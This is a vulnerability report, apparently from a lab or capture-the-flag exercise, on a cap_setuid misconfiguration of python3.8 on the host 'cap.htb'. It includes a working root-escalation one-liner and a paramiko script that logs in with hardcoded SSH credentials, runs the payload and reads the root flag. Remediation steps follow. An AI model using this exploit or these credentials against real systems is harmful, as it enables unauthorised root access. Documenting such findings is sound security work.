# Privilege Escalation via Insecure Linux Capabilities on Python Binary

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-28 14:27:21 UTC
**Target:** cap.htb (Linux OS)
**CWE:** CWE-269
**CVSS:** 7.8

## Description

The `/usr/bin/python3.8` binary on the target system has been assigned overly permissive Linux capabilities, specifically `cap_setuid` and `cap_net_bind_service`. This misconfiguration allows any user who can execute the Python binary to elevate their privileges to `root` by modifying the effective user ID during execution.

## Impact

A local, unprivileged attacker can execute arbitrary code with root privileges. This leads to a complete compromise of the system, allowing the attacker to read, modify, or delete any file, install persistent backdoors, and access sensitive data, such as the root flag (`/root/root.txt`).

## Technical Analysis

Linux capabilities divide the privileges traditionally associated with superuser into distinct units. The `cap_setuid` capability allows a process to make arbitrary manipulations of process UIDs. Because the `/usr/bin/python3.8` executable has this capability, a standard user can invoke Python and use the `os.setuid(0)` function to change the process's effective UID to 0 (root). Subsequently, any system commands executed via `os.system()` or similar functions within that Python process will be executed with root privileges.

## Proof of Concept

1. Gain initial access to the system as a standard user (e.g., via the SSH credentials obtained from the IDOR vulnerability).
2. Verify the capabilities of the Python binary using the command: `getcap -r / 2>/dev/null`. Observe that `/usr/bin/python3.8` has `cap_setuid,cap_net_bind_service+eip`.
3. Execute the following Python one-liner to spawn a root shell or execute commands as root: `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'`
4. The output will confirm execution as the `root` user and display the contents of the root flag.

```
import paramiko
import sys

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('cap.htb', username='nathan', password='Buck3tH4TF0RM3!')

# Execute the payload utilizing the cap_setuid capability
stdin, stdout, stderr = client.exec_command("python3 -c 'import os; os.setuid(0); os.system(\"cat /root/root.txt\")'")

print("ROOT FLAG: " + stdout.read().decode().strip())
client.close()
```

## Remediation

1. Remove the unnecessary and dangerous `cap_setuid` capability from the `/usr/bin/python3.8` binary. This can be done using the `setcap` command: `sudo setcap -r /usr/bin/python3.8` or `sudo setcap cap_net_bind_service+eip /usr/bin/python3.8` if the network binding capability is legitimately required.
2. Regularly audit system binaries for unexpected or overly permissive capabilities.
3. Apply the principle of least privilege, ensuring that users and applications only have the permissions necessary to perform their required tasks.
